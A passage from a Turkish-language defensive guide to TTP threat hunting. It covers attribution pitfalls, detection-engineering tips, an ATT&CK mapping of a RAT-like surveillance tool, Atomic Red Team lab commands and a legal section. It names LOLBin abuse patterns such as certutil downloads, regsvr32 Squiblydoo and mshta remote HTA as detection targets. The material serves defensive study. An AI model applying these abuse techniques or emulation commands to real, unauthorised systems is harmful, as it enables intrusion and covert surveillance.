1. **TTP overlap (örtüşme):** Birçok aktör **aynı teknikleri** kullanır (Mimikatz, PsExec, PowerShell herkesin elinde). "Bu Mimikatz kullanmış → demek APT-X" çıkarımı **yanlıştır** — Mimikatz'ı yüzlerce aktör kullanır. Yalnızca *yaygın* teknikler atfetme için zayıftır.
2. **Copy-cat (taklit):** Aktörler birbirinin TTP'lerini **bilerek taklit eder** — açık raporlardan başka grupların yöntemlerini kopyalayıp **yanlış ize sürmek** (false flag) için. "APT28 gibi davranan" bir saldırı, gerçekte bambaşka bir aktör olabilir (kasıtlı yanıltma).
3. **Tooling commoditization:** Sızdırılmış araçlar (örn. Conti/Cobalt Strike sızıntıları) herkesin eline geçer → eskiden "imza" olan araç artık jeneriktir.

### 11.3 Sağlam atfetme nasıl olur

- **Tek teknikle değil, TTP *kümesiyle*** çalış: yaygın olmayan, aktöre özgü procedure'ların **kombinasyonu** (nadir bir araç + spesifik altyapı deseni + operasyonel zamanlama + kod artefaktı) atfetmeyi güçlendirir. Tek bir yaygın teknik asla yetmez.
- **Birden çok istihbarat boyutu:** TTP + altyapı + malware kod benzerliği + zamanlama + hedefleme + dil/locale → çok-kaynaklı korelasyon.
- **Güven seviyesi belirt:** Atfetme **olasılıksaldır** ("orta güvenle APT-X ile örtüşüyor"), **kesin değil.** Ciddi atfetme devlet/üst-düzey CTI işidir; çoğu savunmacı için **doğru aksiyon, atfetmeden çok tespittir** — "kim olduğu" yerine "nasıl durdururum".

> 🧠 **Altın kural:** **Atfetme bir bonus, tespit bir zorunluluktur.** Savunmacı olarak asıl işin "bu APT28 mi?" diye tartışmak değil, **TTP'yi tespit edip durdurmaktır.** TTP overlap ve copy-cat yüzünden hatalı atfetme, yanlış savunma kararlarına ve diplomatik/itibari hasara yol açar. TTP'leri **savunmak için** kullan; atfetmeyi **temkinli, çok-kaynaklı ve olasılıksal** yap.

---

<a id="12"></a>
## 12. 🔥 PÜF NOKTALARI — Piyasada Bulamayacakların

Çoğu rehberin atladığı, TTP avcılığını gerçek dünyada **çökerten ya da ustalaştıran** detaylar. Her madde ya bir kör noktayı kapatır ya da avını bir seviye yukarı taşır.

### 12.1 TTP'nin kalıcılığını sömür — yatırımı yukarı kaydır
Pyramid of Pain'in pratik emri: tespit yatırımını hash/IP'den (saniyede değişir) **TTP'ye** (yıllarca değişmez) kaydır. Bir tekniğin değişmez davranışsal çekirdeğine yazılan tek kural, aktörün *tüm* IP/domain/hash/araç değişikliklerine dayanır. "Bir TTP tespiti = bin IOC bloğu" değerindedir çünkü saldırgana **gerçek acı** verir.

### 12.2 Procedure varyasyonu kör noktası — imzaya değil davranışa yaz
En sık tespit hatası: tek bir procedure'a (tam komut, tam araç adı, tam string) kural yazmak. Aktör `-enc`'i `-e`'ye, `mimikatz.exe`'yi `m.exe`'ye, `IEX`'i `Invoke-Expression`'a çevirir → atomik kuralın **ölür.** Çözüm: tekniğin **değişmez davranışsal çekirdeğine** (anormal parent, lsass'a VM_READ, script-block içeriği) yaz → tüm procedure varyasyonlarını yakala (Bölüm 6, 7).

### 12.3 False positive — meşru admin aracı = saldırgan aracı (PsExec tuzağı)
TTP tespitinin en zor yanı: **saldırganın kullandığı araçların çoğu meşrudur.** PsExec hem sysadmin'in günlük aracı hem saldırganın lateral movement silahıdır. `powershell`, `wmic`, `rundll32`, `certutil` — hepsi çift kullanımlı. Sadece "PsExec çalıştı" diye alarm verirsen **SOC'u boğarsın.** Çözüm: **bağlamla daralt** — *kim* (anormal hesap/host), *nereden* (beklenmedik kaynak), *ne zaman* (mesai dışı), *neyle birlikte* (cred access + lateral zinciri). Aracın *varlığı* değil, **anormal bağlamı** alarm vermeli.

### 12.4 Detection coverage boşluğu — göremediğini avlayamazsın
Tespit, görünürlük kadardır. Sysmon yoksa, PowerShell 4104 kapalıysa, komut-satırı denetimi (4688) yoksa → o teknikler senin için **görünmez.** Önce **coverage haritası** çıkar (hangi teknik hangi log ile görünür, hangileri kör), kör koridorları kapatacak telemetriyi devreye al, **sonra** kural yaz (Bölüm 10). "Önce göz, sonra silah."

### 12.5 Hunting hipotezi kaynağı — rastgele değil, istihbarat-yönlü
"Ne arayacağımı bilmiyorum" tuzağı. Hipotezini **kaynaktan** üret: ATT&CK teknikleri, sektörünü hedefleyen aktörlerin TTP'leri (Navigator katmanı), son olayın dersleri, "crown jewel" risk analizi, tehdit raporları. İstihbarat-yönlü av, rastgele log karıştırmaktan kat kat verimlidir (Bölüm 9). ATT&CK = bitmeyen hipotez kaynağı.

### 12.6 "Her şeyi tespit" yanılgısı — boğaz noktalarına odaklan
~200 teknik var; hepsini eşit tespit etmeye çalışmak imkânsız ve alert yorgunluğuyla biter. Bunun yerine aktörün **kaçınamayacağı boğaz noktalarına** (chokepoints) yatırım yap: credential access (LSASS), anormal parent-child zincirleri, log silme (T1490/T1070), lateral movement kimlik anomalisi. Az sayıda **yüksek-isabet** kural, yüzlerce gürültülü kuraldan iyidir.

### 12.7 Behavioral vs atomic denge — ikisini katmanla
Atomic (IOC) ve behavioral (TTP) **rakip değil, katman.** Atomic ucuz/hızlı/kesin ama kırılgan; behavioral dayanıklı ama ayar ister ve FP'ye eğilimli. Doğru mimari: atomic'i "düşük asılı meyve" için (hızlı blok), behavioral'ı asıl savunma için kullan. Birini diğeri için terk etme — **katmanlı savunma.**

### 12.8 Data source eksikliği — telemetri olmadan kural hayal
Kural yazmadan önce sor: "Bu tekniği görecek log bende **üretiliyor ve toplanıyor** mu?" Çoğu başarısız tespit, kural hatasından değil **eksik/toplanmayan telemetriden** kaynaklanır. Sysmon konfigini (event seçimi) ve log iletimini (forwarding) doğrula — yereldeki log SIEM'e gitmiyorsa yokmuş gibidir.

### 12.9 Sigma kuralı bakımı — yaz-unut değil
Sigma kuralları yaşayan varlıklardır: alan adları şema güncellemesiyle değişir (pipeline güncelle), FP'ler ortama göre birikir (filter geliştir), yeni procedure'lar çıkar (kuralı genişlet). Topluluk kuralını (SigmaHQ) körü körüne alma — **kendi ortamında test et ve uyarla.** Bakımsız kural ya kör kalır ya gürültü üretir (Bölüm 8).

### 12.10 Alert yorgunluğu (alert fatigue) — kalite > nicelik
Yüzlerce düşük-kaliteli alarm, analistleri **körleştirir** — gerçek tehdit gürültüde boğulur ("kurt geldi" sendromu). Her kuralın bir **FP bütçesi** olmalı; sürekli yanlış-pozitif veren kural ya rafine edilir ya kapatılır. **Alarmı azaltıp isabeti artırmak, kural eklemekten daha değerlidir.** İyi SOC, az ama güvenilir alarm üretir.

### 12.11 TTP'yi bağlamdan koparma — teknik tek başına anlamsız
"T1059.001 PowerShell tespit edildi" tek başına işe yaramaz — PowerShell meşru da olur. TTP **her zaman bağlamıyla** değerlendirilir: hangi host, hangi kullanıcı, hangi parent, hangi zincirin parçası, hangi varlık. İzole bir teknik bulgusu değil, onu bir **kill-chain'e** bağlayan bağlam alarm verir. "Teknik sayma, hikâye kur."

### 12.12 Living-off-the-land (LOLBins) zorluğu — meşru ikiliyi kötüye kullanma
Modern aktörler kendi araçlarını getirmek yerine **sistemin meşru ikililerini** (LOLBins: `certutil`, `bitsadmin`, `mshta`, `regsvr32`, `rundll32`, `wmic`, `msbuild`) kötüye kullanır → AV/imza tabanlı savunma kör kalır çünkü "imzalı Windows aracı" çalışıyor. Tespit **davranışsal olmak zorundadır:** `certutil`'in dosya *indirmesi*, `regsvr32`'nin *uzak scriptlet* (Squiblydoo) çalıştırması, `mshta`'nın *uzak HTA* açması anormaldir. LOLBAS projesi (teyit et) bu ikililerin kötüye kullanımını kataloglar → tespit hipotezi kaynağı. **"İmzalı = güvenli" en tehlikeli varsayımdır.**

### 12.13 Tespit olgunluk seviyesi — nerede olduğunu bil
Ekibinin tespit olgunluğunu dürüstçe konumla (Bölüm 7.5 / HMM): sadece AV imzasında mı, atomic IOC'de mi, tek-teknik behavioral'da mı, çok-teknik korelasyonda mı, proaktif hunting'de mi? Olgunluk **sıçramaz, tırmanır** — önce görünürlük (Sysmon/log), sonra atomic, sonra behavioral, sonra korelasyon, sonra hunting. Bulunduğun seviyeyi bilmeden bir üstüne geçemezsin.

### 12.14 Sub-technique granülaritesi — doğru çözünürlükte avla
ATT&CK alt-teknikleri (T1059**.001** PowerShell vs T1059**.003** cmd) farklı tespit gerektirir. "T1059 tespit ediyorum" demek yetmez — *hangi alt-teknik?* Çok kaba (sadece ana teknik) → procedure'ı kaçırırsın; çok ince (tek procedure) → varyantı kaçırırsın. Doğru çözünürlük: **alt-teknik seviyesinde davranışsal**, procedure varyasyonlarını kapsayacak şekilde.

### 12.15 Veri çürümesi & zaman penceresi — log retention tuzağı
TTP avı geçmişe bakar; ama logların **saklama süresi** (retention) avının ufkunu belirler. APT'ler aylarca sessiz kalır (dwell time ortalaması haftalar-aylar) → 7 günlük log retention ile uzun-vadeli aktörü **asla** avlayamazsın. Kritik telemetriyi yeterince uzun sakla; aksi halde "geçmişe avlanma" geçmişin silinmişliğinde çöker.

### 12.16 Tespiti test et — "purple team" / Atomic Red Team
Yazdığın kuralın **gerçekten ateşlendiğini** varsayma, **kanıtla.** Atomic Red Team / Caldera ile tekniği kontrollü üret (Bölüm 15), kuralının alarm verdiğini gör. Test edilmemiş tespit = umut, kanıt değil. "Purple team" döngüsü (kırmızı teknik üretir, mavi tespit ettiğini doğrular) detection engineering'in kalite güvencesidir.

> 🧠 **Püf noktalarının özü:** TTP avcılığı üç sütun — **(1) doğru altitude** (procedure değil teknik avla — Pyramid'de yukarı), **(2) görünürlük** (göremediğini avlayamazsın — coverage önce gelir), **(3) bağlam + kalite** (izole teknik değil kill-chain; az ama isabetli alarm). Üçünden biri çökerse: ya kırılgan imza yazarsın (varyant atlatır), ya kör koridor bırakırsın (aktör oradan geçer), ya da alarm yorgunluğunda gerçeği kaçırırsın.

---

<a id="13"></a>
## 13. ☠️ Yaygın Hatalar

1. **Sadece IOC'ye güvenmek** → hash/IP/domain bloklayıp "korunduk" sanmak; aktör varyantla anında atlatır. Pyramid'in dibinde takılı kalmak. **En yaygın hata.**
2. **Procedure'a kural yazmak** → tek komuta/araç adına imza koymak; aktör procedure'unu değiştirince kör kalmak (davranışa yazılmalıydı).
3. **Technique sayma (vanity metrics)** → "300 tekniği kapsıyoruz" diye övünmek ama her birini kalitesiz/bağlamsız tespit etmek; alert yorgunluğu + gürültü. Kapsama sayısı ≠ tespit kalitesi.
4. **Bağlamsız avlama** → rastgele log karıştırmak; hipotez kaynağı (ATT&CK/istihbarat) olmadan av yapmak → verimsiz, sonuçsuz.
5. **Coverage'ı varsaymak** → "tespit ediyoruz" demek ama besleyen log üretilmiyor/toplanmıyor; göremediğin tekniği avladığını sanmak.
6. **Meşru aracı körü körüne bloklamak** → PsExec/PowerShell'i bağlamsız alarmlamak; SOC'u FP'ye boğmak ve gerçek tehdidi kaybetmek.
7. **TTP'yi atfetmeyle karıştırmak** → "Mimikatz kullandı = APT-X" gibi tek-teknikle kesin atfetme; copy-cat/overlap tuzağına düşmek.
8. **Sigma kuralını test etmeden yayımlamak** → ya hiç ateşlenmez (kör) ya tüm SOC'u boğar (gürültü); purple-team doğrulaması yok.
9. **LOLBin'leri görmezden gelmek** → "imzalı Windows aracı = güvenli" varsayımı; certutil/mshta/regsvr32 kötüye kullanımını kaçırmak.
10. **Avı kurala çevirmemek** → tehdidi elle bulup otomatikleştirmemek; yarın aynı şeyi yine elle aramak. Av kalıcı tespite dönüşmeli.
11. **Log retention'ı yetersiz tutmak** → 7 günlük logla aylarca sessiz kalan APT'yi geçmişe avlamaya çalışmak; veri çoktan silinmiş.
12. **Atomic ve behavioral'ı rakip görmek** → birini terk etmek; ikisi katmandır, birlikte güçlüdür.

---

<a id="14"></a>
## 14. 🏰 Kanije Kalesi ile — Öz-Farkındalık & Avcı Gözüyle

En öğretici TTP egzersizi: **kendi savunma aracını bir avcı gözüyle incelemek.** Kanije Kalesi, *meşru savunma amaçlı* olsa da, davranışsal olarak bir **RAT (Remote Access Trojan)** ile örtüşen yetenekler taşır — bu, hem öz-farkındalık hem de **"meşru araç = false positive"** dersini somutlaştıran mükemmel bir vaka çalışmasıdır.

### 14.1 Kanije'nin davranışları → ATT&CK TTP eşlemesi

Kod tabanından doğrulanmış davranışların TTP karşılığı:

| Kanije davranışı (gerçek) | ATT&CK eşleme | Bir avcı bunu nasıl görür |
|---|---|---|
| **Telegram bot ile uzaktan komut alma** (`api.telegram.org`, long-poll `getUpdates`) | **T1102** Web Service (C2) + **T1071.001** Web Protocols | Meşru bulut servisine (Telegram) düzenli giden HTTPS — "meşru servisi C2 olarak kullanma" deseni |
| **Windows Task Scheduler ile otomatik başlatma** (görev adı `KanijeKalesi`) | **T1053.005** Scheduled Task | EID 4698 / schtasks → makinede açılışta çalışan yeni görev |
| **Kamera/foto çekme, ekran yakalama** | **T1125** Video Capture + **T1113** Screen Capture | Bir process'in kamera/ekran cihazına erişimi |
| **Ses kaydı** | **T1123** Audio Capture | Mikrofon erişimi |
| **Dosya/process izleme, erişim denetimi** (`/erisim` SACL) | **T1057** Process Discovery + **T1083** File/Directory Discovery | Sistem-geneli keşif/izleme aktivitesi |
| **Güvenli dosya silme** (`/imha`) | **T1485** Data Destruction / **T1070** Indicator Removal | Dosyaların güvenli/kurtarılamaz silinmesi |
| **Kurcalama tespiti, dead-man tetikleyici** (`/koruma`) | **T1546** Event Triggered Execution (savunma yönü) | Koşula bağlı otomatik tepki mantığı |

> ⚠️ **Önemli sınır (öz-farkındalık):** Kanije, kamera-LED bypass ve USB-içerik-kopyalama gibi *gerçek-saldırgan* yeteneklerini **bilinçli olarak reddeder** (bellekteki güvenlik yol haritası notu). Yani davranışsal *benzerlik* RAT'a yakındır ama *niyet ve sınırlar* savunmacıdır — bu ayrım, atfetmenin "TTP benzerliği ≠ kötücüllük" dersinin ta kendisidir.

### 14.2 🔥 Bir avcı Kanije'yi nasıl yakalar (çözümlü)

```
┌──────────────────────────────────────────────────────────────────────────┐
│  AV SENARYOSU: "Bu makinede RAT-benzeri bir araç var mı?"                 │
├──────────────────────────────────────────────────────────────────────────┤
│  HİPOTEZ    │ Bir process AYNI ANDA: uzak-komut C2 + kamera/ekran erişimi│
│             │ + persistence + güvenli-silme yeteneği gösteriyorsa → RAT? │
│  TTP        │ T1102/T1071 (C2) + T1053.005 (persist) + T1125/T1113       │
│  KÜMESİ     │ (capture) + T1485 (destroy) — TEK BAŞINA hiçbiri kesin     │
│             │ değil ama KOMBİNASYONU güçlü sinyal                        │
│  VERİ KAYNAĞI│ Sysmon EID 1 (process), EID 3/22 (Telegram'a ağ/DNS),    │
│             │ EID 4698 (KanijeKalesi görevi), kamera/mic cihaz erişimi  │
│  BULGU      │ "KanijeKalesi" görevi + api.telegram.org beacon + kamera   │
│             │ erişimi → avcı bu KOMBİNASYONU yakalar                     │
│  KRİTİK     │ 🔥 Avcı şimdi ayırt etmeli: bu KÖTÜCÜL RAT mı, yoksa       │
│  AYRIM      │ MEŞRU savunma aracı (Kanije) mı?                          │
│             │  → İmza/yol/dijital imza/kaynak doğrula                    │
│             │  → Sahibinin bilinçli kurduğu araç mı?                     │
│             │  → NİYET ve YETKİ kontrolü (TTP benzer, bağlam farklı)     │
└──────────────────────────────────────────────────────────────────────────┘
```

### 14.3 🔥 Avcı için iki kalıcı ders (Kanije vakasından)

1. **TTP benzerliği kötücüllüğü kanıtlamaz — bağlam şart.** Kanije'nin "uzak-komut + kamera + persistence" kombinasyonu davranışsal olarak bir RAT'a benzer, ama meşru, sahibinin bilinçli kurduğu bir savunma aracıdır. Bir avcı, *davranışı* tespit ettiğinde **niyeti/yetkiyi doğrulamadan** "kötücül" damgası vuramaz (Bölüm 12.3 false positive + Bölüm 11 atfetme tuzağı). **"Davranış şüpheli görünebilir; karar bağlamla verilir."**

2. **Kendi tespitin kendi meşru aracını yakalar — kuralı daralt.** Eğer "uzak-komut + kamera + persistence" davranış kombinasyonuna bir Sigma/EDR kuralı yazarsan, bu kural **Kanije'yi (ve meşru RMM/yönetim araçlarını) false-positive** olarak yakalar. Çözüm: kuralı bu **meşru araçları dışlayacak** şekilde daralt (imza/yol/hash/yayıncı whitelist'i — tıpkı LSASS kuralında AV/EDR'ı dışladığın gibi, Bölüm 8.4). Aksi halde **kendi savunma aracın, kendi avının kurbanı** olur ve alert yorgunluğu yaratır.

> 🧠 **Felsefe örtüşmesi:** Kanije Kalesi **"uç-noktada nöbet tut, olay anını yönet"**; TTP avcılığı **"davranışı oku, tehdidi proaktif yakala."** Kanije'yi kendi TTP merceğinden incelemek, en derin CTI dersini verir: *bir aracı tehlikeli ya da güvenli yapan TTP'leri değil, niyeti, yetkisi ve bağlamıdır.* Aynı teknik (uzak komut, kamera, persistence) bir saldırganın elinde silah, bir savunmacının elinde kalkandır — **avcının işi, davranışı görüp bağlamla doğru kararı vermektir.**

---

<a id="15"></a>
## 15. 🚀 Zero-to-Hero Yol Haritası + Atomic Red Team ile Antrenman

### 15.1 Aşamalı yol haritası

```
   FAZ 0 — TEMEL (kavram)
     □ Tactic/Technique/Procedure ayrımını ÖRNEKLE anlat (Bölüm 1)
     □ Pyramid of Pain'i ezberle ve İÇSELLEŞTİR (Bölüm 3) — her gösterge için
       "saldırgana ne kadar acı?" diye sor
     □ IOC vs TTP farkını bir senaryoyla kavra (Bölüm 4)

   FAZ 1 — GÖRÜNÜRLÜK (önce göz)
     □ Bir lab kur (Windows VM + Sysmon + iyi konfig — SwiftOnSecurity)
     □ PowerShell script-block logging + komut-satırı denetimi (4688) aç
     □ Logları bir SIEM'e topla (Splunk Free / ELK / Wazuh)
     □ Coverage haritasını çıkar (hangi teknik görünür?) (Bölüm 10)

   FAZ 2 — TESPİT (atomic → behavioral)
     □ ATT&CK ile bir teknik seç (örn. T1053.005) → data source → log → kural
     □ İlk Sigma kuralını yaz (Bölüm 8) ve sigma-cli ile SIEM'e çevir
     □ Atomic vs behavioral farkını kendi kuralında uygula (Bölüm 7)

   FAZ 3 — ANTRENMAN (purple team)
     □ Atomic Red Team ile tekniği KONTROLLÜ üret → kuralın ateşlendi mi?
     □ Kuralı rafine et (FP azalt, varyasyon kapsa) → tekrar test

   FAZ 4 — AVLAMA (proaktif)
     □ Hipotez-tabanlı bir hunt çalıştır (Bölüm 9 örnekleri)
     □ Bulguyu (varsa) müdahaleye, her durumda KURALA çevir
     □ Hunting maturity'de tırman (HMM1 → HMM3)

   FAZ 5 — USTALIK (sürekli)
     □ Detection engineering'i sürekli kıl (yeni teknik → yeni tespit)
     □ Coverage boşluklarını kapat, alert kalitesini artır
     □ Atfetmeyi temkinli/çok-kaynaklı yap; CTI döngüsünü kapat
```

### 15.2 🔥 Atomic Red Team ile kendi kendine TTP üret + tespit antrenmanı

**Atomic Red Team** (Red Canary), her ATT&CK tekniği için **küçük, atomik, kontrollü test** komutları içeren açık-kaynak bir kütüphanedir. Bir tekniği **güvenle** çalıştırıp **kendi tespitinin çalışıp çalışmadığını** doğrularsın — "purple team" antrenmanının temeli.

```powershell
# Atomic Red Team — Invoke-AtomicRedTeam ile (YALNIZCA izole lab VM'inde!)
# (sürüm/komut değişebilir — teyit et: github.com/redcanaryco/atomic-red-team)

# 1. Belirli bir tekniğin test detayını gör (örn. T1053.005 scheduled task)
Invoke-AtomicTest T1053.005 -ShowDetailsBrief

# 2. Ön gereksinimleri getir
Invoke-AtomicTest T1053.005 -GetPrereqs

# 3. Tekniği KONTROLLÜ çalıştır (bir scheduled task oluşturur)
Invoke-AtomicTest T1053.005

# 4. → Şimdi SIEM'ine bak: Sigma kuralın ATEŞLENDİ Mİ?
#    (EID 4698 / schtasks komut satırı yakalandı mı?)
#    Ateşlenmediyse: coverage eksik mi, kural mı hatalı? → düzelt, tekrarla

# 5. Temizlik (oluşturulan artefaktı geri al — lab'ı temiz tut)
Invoke-AtomicTest T1053.005 -Cleanup
```

**Antrenman döngüsü (purple team):**
```
   ATT&CK'ten teknik seç
        │
        ▼
   Atomic Red Team ile ÜRET (kırmızı) ──► izole lab VM'de
        │
        ▼
   SIEM/Sigma kuralın ATEŞLENDİ Mİ? (mavi)
        │
   ┌────┴────┐
   EVET      HAYIR
   │          │
   Kuralı     Coverage mı eksik (log yok)? Kural mı hatalı?
   sağlamlaştır → düzelt → TEKRAR ÜRET
   (FP test,
   varyasyon)
```

> ⚠️ **Lab sınırı:** Atomic Red Team gerçek sistem değişiklikleri yapar (görev oluşturur, registry yazar vb.) → **YALNIZCA izole, yetkili bir lab VM'inde** çalıştır, asla üretim/günlük makinede. `-Cleanup` ile artefaktları geri al. (Malware lab disiplini için → `MALWARE_ANALIZ_USTALIK_REHBERI.md`.)

### 15.3 Pratik kaynaklar (zero-to-hero)

| Kaynak | Ne için |
|---|---|
| **MITRE ATT&CK** (attack.mitre.org) | Teknik referansı, hipotez kaynağı, ortak dil |
| **Pyramid of Pain** (D. Bianco blog) | Temel zihinsel model — tekrar tekrar oku |
| **Atomic Red Team** (Red Canary) | Teknik üretip tespit antrenmanı (purple team) |
| **Sigma / SigmaHQ** (github) | Platform-bağımsız tespit kuralları + örnek havuzu |
| **MITRE Caldera** | Otomatik adversary emulation (ileri purple team) |
| **DeTT&CT** | Data source coverage haritalama |
| **LOLBAS / GTFOBins** | LOLBin kötüye kullanım kataloğu (tespit hipotezi) |
| **Sysmon + SwiftOnSecurity config** | Görünürlüğün temeli |
| **The DFIR Report / Red Canary Threat Report** | Gerçek dünya TTP örnekleri (vaka çalışması) |

---

<a id="16"></a>
## 16. ✅ Hızlı Referans & Kontrol Listesi

### 🔥 Pyramid of Pain — hızlı tablo

| Seviye | Gösterge | Saldırgana acı | Değiştirme süresi | Senin önceliğin |
|---|---|---|---|---|
| 6 — **TTPs** | Davranış/oyun kitabı | 😈 Maksimum | Aylar–yıllar | ⭐⭐⭐⭐⭐ Stratejik yatırım |
| 5 — **Tools** | Mimikatz, CS, PsExec | 😩 Ciddi | Haftalar–aylar | ⭐⭐⭐⭐ YARA + davranış |
| 4 — **Net/Host Artifacts** | UA, mutex, JA3, Run key | 😠 Can sıkıcı | Günler | ⭐⭐⭐ Behavioral kural |
| 3 — **Domain Names** | C2 domain, DGA | 😒 Bedelli | Saatler–günler | ⭐⭐ Sinkhole/blocklist |
| 2 — **IP Addresses** | C2/exfil IP | 🙂 Kolay | Dakikalar–saatler | ⭐ Firewall blok |
| 1 — **Hash Values** | MD5/SHA-256 | 😐 Sıfır | Saniyeler | ☆ Hızlı triyaj/blok |

### Bir TTP'yi tespite çevirme — 4 adım
- [ ] **1. Teknik:** ATT&CK ID ile netleştir (T-numarası + alt-teknik)
- [ ] **2. Data source:** O tekniği hangi log/telemetri görür? (coverage var mı?)
- [ ] **3. Log/olay:** Somut iz hangi EID / komut satırı / alan?
- [ ] **4. Kural:** Sigma yaz (logsource + detection + condition) → SIEM'e çevir → **TEST ET**

### Sigma kuralı kalite kontrolü
- [ ] **Davranışa** yazıldı (procedure/string'e değil)? — varyasyona dayanıklı mı?
- [ ] `logsource` doğru kategori/ürün?
- [ ] `condition`'da meşru araçlar `filter` ile dışlandı mı? (FP)
- [ ] **Atomic Red Team ile test edildi** — gerçekten ateşleniyor mu?
- [ ] **Temiz/üretim verisinde** FP testi yapıldı mı?
- [ ] Doğru `level` ve ATT&CK `tags` eklendi mi?

### Threat hunting oturumu
- [ ] **Hipotez** istihbarat-yönlü mü? (ATT&CK/aktör/risk kaynaklı)
- [ ] **Veri kaynağı** belirlendi ve mevcut mu? (coverage)
- [ ] Sorgu mantığı **davranışsal** mı (atomic değil)?
- [ ] Bulgu bir **kill-chain bağlamına** oturtuldu mu?
- [ ] Av sonucu **bir kurala** çevrildi mi? (otomatikleştirme)

### Görünürlük (önce göz) kontrol listesi
- [ ] **Sysmon** kurulu + iyi konfig (process/network/EID 10/registry/DNS)
- [ ] **PowerShell script-block logging** (EID 4104) açık
- [ ] **Komut-satırı denetimi** (EID 4688) açık
- [ ] Gerekli **object-access denetimleri** (EID 4698 vb.) açık
- [ ] Loglar **SIEM'e iletiliyor** ve **yeterince uzun saklanıyor** (retention)
- [ ] **Coverage haritası** çıkarıldı (kör koridorlar biliniyor)

---

<a id="17"></a>
## 17. ⚖️ Hukuki & Etik Sınır

- **Savunma amaçlı.** Bu rehber **tespit, threat hunting, detection engineering ve olay müdahalesi** içindir — saldırı tekniği geliştirmek, yetkisiz erişim ya da gerçek sistemlere zarar için **değil.** TTP'leri **tanımak ve avlamak** için öğren.
- **Atomic Red Team / teknik üretimi yalnızca yetkili lab'da.** Teknik üreten araçlar (Atomic Red Team, Caldera) **gerçek sistem değişiklikleri** yapar → yalnızca **sana ait, izole, yetkili bir lab ortamında** çalıştır. Üretim/başkasının sistemine **asla.** İzinsiz "test", birçok yargı bölgesinde yetkisiz erişim/zarar suçudur.
- **Atfetmede sorumluluk.** Hatalı atfetme (copy-cat/overlap tuzağı) yanlış suçlamalara, yanlış savunma kararlarına ve itibari/diplomatik hasara yol açar. Atfetmeyi **temkinli, çok-kaynaklı, olasılıksal** yap ve güven seviyesi belirt; kesinlik iddiasından kaçın.
- **Veri ve gizlilik.** Threat hunting log/telemetri analizi içerir — bu loglar **kişisel veri** barındırabilir (kullanıcı adları, dosya yolları, ağ aktivitesi). Veri-koruma yükümlülüklerine (KVKK/GDPR vb.), kurumsal politikaya ve erişim yetkilerine uy.
- **İstihbarat paylaşımı.** TTP/IOC paylaşırken **TLP** (Traffic Light Protocol) ile sınırı belirle; hedefli bir aktörün TTP'sini dikkatsizce kamuya açmak, aktörü uyarabilir ve mağdurları açığa çıkarabilir (OPSEC). Detay → `MALWARE_ANALIZ_USTALIK_REHBERI.md` (MISP/STIX) ve `OSINT_ARAC_SETI_USTALIK_REHBERI.md`.
- **Yargı bölgesi.** Bulunduğun ülkenin yasalarına ve kurumunun politikasına uy.

---

> 🏰 **Kapanış:** TTP avcılığı bir araç değil, bir **bakış açısıdır.** En pahalı SIEM, en uzun IOC feed'i bile; saldırganın *davranışını* değil yalnızca *imzasını* avlıyorsan, bir sonraki varyantta çaresizdir. Pyramid of Pain sana tek bir gerçeği öğretir: **hash avlayan oyalanır, IP kovalayan geriden koşar — ama TTP avlayan, saldırganı kendi oyun kitabını değiştirmeye zorlar.** Bu, savunmanın en pahalı, en kalıcı, en onurlu işidir: aktöre her temasta **acı vermek.**
>
> Üç altın kuralı asla unutma: **(1) Doğru altitude'da avla** — procedure'ı değil tekniği; imzayı değil davranışı (Pyramid'de yukarı çık). **(2) Önce gör, sonra avla** — göremediğin tekniği tespit edemezsin; görünürlük (coverage) her kuraldan önce gelir. **(3) Bağlam kraldır** — izole bir teknik anlamsızdır; onu bir kill-chain'e, bir hikâyeye, bir niyete bağladığında istihbarat olur. Bunu içselleştirdiğinde IOC bloklayan bir operatör olmaktan çıkıp, **davranışı okuyan bir avcı** olursun — saldırgan IP'sini bin kez değiştirse de izini sürebilen.
>
> *Bu doküman Kanije Kalesi güvenlik rehberleri koleksiyonunun parçasıdır. İlgili: `MITRE_ATTACK_USTALIK_REHBERI.md` (ATT&CK aracı: Navigator, aktör belirleme, rapor — bu rehberin kardeşi), `MALWARE_ANALIZ_USTALIK_REHBERI.md` (örnekten IOC/TTP çıkarma, YARA, MISP/STIX), `WIRESHARK_AG_ANALIZ_USTALIK_REHBERI.md` (C2/beacon ağ tespiti), `OSINT_ARAC_SETI_USTALIK_REHBERI.md` (altyapı/atfetme istihbaratı).*
